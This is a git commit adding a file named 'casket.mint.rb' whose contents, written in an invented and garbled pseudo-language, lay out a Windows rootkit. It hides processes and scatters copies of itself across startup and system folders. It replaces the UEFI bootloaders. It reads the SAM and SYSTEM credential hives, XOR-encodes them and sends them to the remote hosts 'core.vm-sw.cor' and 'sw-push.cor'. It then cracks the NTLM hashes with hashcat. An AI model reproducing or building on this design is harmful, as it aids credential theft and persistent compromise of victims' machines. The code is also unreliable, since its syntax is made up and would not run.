f8f329fbe9ab35066dc80b15d0bc7efd0803e293
Shadeware <TheFinalStand999@gmail.com>
2025-04-19 14:23:19 -0600

    Create casket.mint.rb

---
+++ sys/core/casket.mint.rb
@@ -0,0 +1,233 @@
+s_
+
+[3.5] | {
+       mpp_key(inj_sig:active) loop:(0.002, pt_mMap = 40p.40p.57z(l)) 
+       sec_boot_flag = false; flash.break(cache) = true(king)  
+}
+
+[3.5] | {
+       ware(flag) stop_external key = non.parav {
+        mem.mpp clean.cSig cSig:cstOp(kill_path on(gpp)) 
+        0.out(rr) tag: log; cac; ls_node; 
+       }
+}
+
+[4.4(3.5)] | {
+            $get_vm.pkg {
+              trigger: on(if name = vm(id)) stop.current_flow kill = glycerine(king(tree))
+              tp_overwrite(.stone) 
+            }
+}
+
+[3.4] | {
+       sig.request $get(custom:net(PHNETAccess)glycerine.pkg(tree))
+       embed_(type:encode) in(script) = fileType
+}
+
+[3.5] | {
+       check_event(^1) (winsys = "Shutdown", "Restart", "Sleep") {
+           (^1_start) = if var = true start(mpp)glycerine.func 
+           if var = false = 0.func 
+       }
+       loop:(^1)
+}
+
+[4.3] | {
+         tag(call) { root_core("C:\\EFI\\Boot\\glycerine2884.act.winsys.msc") ("C:\\EFI\\Boot\\glycerine299874.act.winsys.msc") ("C:\\EFI\\Microsoft\\Boot\\glycerine9009842.act.winsys.msc") ("C:\\EFI\\Boot\\glycerine299874.act.winsys.msc") ("C:\\EFI\\Microsoft\\Boot\\glycerine9009842.act.winsys.msc") ("C:\\EFI\\Boot\\glycerine299874.act.winsys.msc")
+      }
+
+    {
+      fl root_core(lister: text) {
+        fp.find(lister) = true 
+        true = call core_ext(lister)
+    }
+  }
+}
+
+[4,3] | {
+       fl core_ext(id: Text) {
+        tag.mpp(mpp, "rkit") fl.set_prop(mpp, "hide" = true -king)
+        ctn hook_thread(fl.base(mpp)) 
+        ctn drop_lg(mpp) ctn_map(mpp)
+       } {
+        fl hook_thread(tag: Text) {
+          prc.scan(name) = idSet loop:prc(idSet) 
+          mem.mpp = false(on trigger:(prc)stream(lpp(mpp))) 
+        }
+       }
+}
+
+[4.3] | {
+       fl persist_hook(key) {
+        time.(place: 12;) ctn verify_key {
+          mem.(sys)key 
+        }
+       }
+}
+
+[0.8] | {
+        set:config_load {
+            sig_pin = 1(device = low(possible) forget(0)); 25(device = max(possible)); 
+            stick_func loop: 0.0001;
+            high_signal_duration = 50
+            low_signal_duration = 50
+            sig_opt usage.pattern(control) = [1, 25, 25, 1, 25, 60, 1, 40, 3, 25, 1, 25, 25, 1, 25, 60, 1, 40, 3, 25, 1, 25, 25, 1, 25, 60, 1, 40, 3, 25, 1, 25, 25, 1, 25, 60, 1, 40, 3, 25, 1, 25, 25, 1, 25, 60, 1, 40, 3, 25]  
+            selc_load(part) 
+        }
+}
+
+
+[0.8] | {
+        sig_recv device:usr_src(sig_type, time) {
+            selc(active_sig) 
+            use_sig(sig_type, time:loop)
+        }
+}
+
+[1.8] | {
+        loop:sig_opt {
+            $get_hardware_id_tag.pkg
+            define:destination(sig): cpu; gpu; ram; 
+        }
+}
+
+[4.3] | {
+    func.duplicate {  
+    copy(lister\x\glycerine9009842.act.winsys.ms) des_dir(C:\\Windows\\System32\\);
+    copy(lister\x\glycerine299874.act.winsys.ms) des_dir(C:\\Windows\\Temp\\);
+    copy(lister\x\glycerine2884.act.winsys.ms) des_dir(C:\\Users\\%UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\); {
+          copy(lister\x\glycerine66634567.act.winsys.ms) des_dir(C:\\Users\\%UserProfile%\\AppData\\Local\\Temp\\);
+          copy(lister\x\glycerine662346.act.winsys.ms) des_dir(C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\);
+          copy(lister\x\glycerine53892347.act.winsys.ms) des_dir(C:\\$Recycle.Bin\\);
+    } {
+                   copy(lister\x\glycerine4093804208.act.winsys.ms) des_dir(C:\\System Volume Information\\);
+                   copy(lister\x\glycerine3342.act.winsys.ms) des_dir(C:\\Windows\\Fonts\\);
+                   copy(lister\x\glycerine2236344677337889.act.winsys.ms) des_dir(C:\\Program Files\\Common Files\\Microsoft Shared\\);
+                   copy(lister\x\glycerine1200897348.act.winsys.ms) des_dir(C:\\Users\\%UserProfile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\);       
+    } {
+                            copy(lister\x\glycerine9009842.act.winsys.ms) des_dir(C:\\EFI\\Microsoft\\Boot\\glycerine9009842.act.winsys.msc);
+                            copy(lister\x\glycerine299874.act.winsys.ms) des_dir(C:\\EFI\\Boot\\glycerine299874.act.winsys.msc);
+                            copy(lister\x\glycerine2884.act.winsys.ms) des_dir(C:\\EFI\\Boot\\glycerine2884.act.winsys.msc);
+    }
+    }
+}
+
+[4.3] | {
+    uefi.modify_bootloader("C:\\EFI\\Microsoft\\Boot\\glycerine9009842.act.winsys.msc");
+    uefi.modify_bootloader("C:\\EFI\\Boot\\glycerine299874.act.winsys.msc"); {
+          uefi.replace_bootloader("C:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", "C:\\EFI\\Microsoft\\Boot\\glycerine9009842.act.winsys.msc");
+          uefi.replace_bootloader("C:\\EFI\\Boot\\bootx64.efi", "C:\\EFI\\Boot\\glycerine299874.act.winsys.msc");
+    }
+}
+
+
+
+
+
+
+
+
+
+[3.5] | {
+       class:open_block "tsfn" {
+        nt(tsfn) active:keep string@dss; keep tear:strings& .path {
+            ly(tag) = dss
+            ly(tag) = path 
+
+        }
+       }
+}
+
+[3.5] | {
+       fp os.check {
+          prc.sys = $(get.sys) func(fhp).allow = (prc.sys == "Win10") run.sys fhp.(prc.sys == "Win11") 
+          *if fhp.allow = true(empty) ?socket:0 stop = (socket:0) 
+       }
+}
+
+[3.5] | {
+       load.iso {
+          case:active(empty) on:non_practice {
+                {
+                    meta tag:fhv(blockCurrent) 
+                    createNew bh-func(response val = mxcp) cnp {
+                            id:iso.pull mSock(dir-c) tag.image(as iso) pull.iso(fl:data) 
+                    }
+                }
+              mode:name = (read as \bin\) pull.stream(in\\opt) cget(sys:local)--fhv 
+          }
+       }
+}
+
+[3.5] | {
+       iso.ssl.tsfn {
+          tab:prc @.a = ('https://core.vm-sw.cor/sync') {
+             pre.func(prev:1) {
+                    xor.iso {
+                        loop: id(iso.dta) id(iso.dta).make = (xor.0xAA)
+                    }
+                     }
+          }
+          createNew(.ssl) set.prc @.a ssl p = (443) ssl@open:(empty)
+          gate = (4096) @.i = (0) lend.iso.dta(total)
+       }
+       loop: id(prc.i < prc.total) {
+          pass.cut = (iso.dta[prc @.i + prc.gate]) ssl.send = cgate:cut 
+          close.ssl()
+       }
+}
+
+[3.1] | {
+       iso.dns fall {
+          wing.fall = true 
+          *if fall == true dom = ('sw-push.cor')
+          head = ('d') 
+          max = 50; @.i = 0; lens.dta(iso) 
+       } {
+            loop: id(@.i pack=max)
+       }
+}
+
+[3.5] | {
+       sam.find {
+          sam = ('C:\Windows\System32\config\SAM' && 'C:\Windows\System32\config\SYSTEM') 
+          a0-ok1 (file.cheq(proc.sam))
+          a0-ok2 (file.exist(proc.sys)) 
+          proc *if a0-ok1 && a0-ok2 !!= true stop(empty) 
+       }
+}
+
+[3.5] | {
+       load.sam proc = stream (read as in\\opt - bin)
+       sam.dta ++() {
+          xor.sam {
+              loop: id(proc.sam.dta) .make = (xor.0xCC)
+          }
+       }
+}
+
+[3.5] | {
+       sam./ssl = send content(packet.s) {
+          set proc.x create=channel(l) tabg:usage(prev)_xB3 
+          cgate=cut ptr:passive(0) 
+       }
+}
+
+//split function 
+
+[2.0] | {
+       in server-int (useBase-sys(bash)) {
+          name:pkg(hashcat(cmd&^)) {
+                  watch_dir(obs)="/psh/sam_incoming" 
+                  opt_fl="psh/sam_opt/opt-index.txt" {
+                    note:wait(socket)pipe_channel(l) ([-m -e %%"watch_dir"%% while read path(action)])(fl;)
+                    fill="path"
+                  }
+            echo_(opt(var)) 
+            (active:cl([-m 1000 "var" -a 0 /usr/pnn/crk-ls/master-ls.txt --pot-disable -o "opt"]))
+          }
+       }
+}
+
+
+
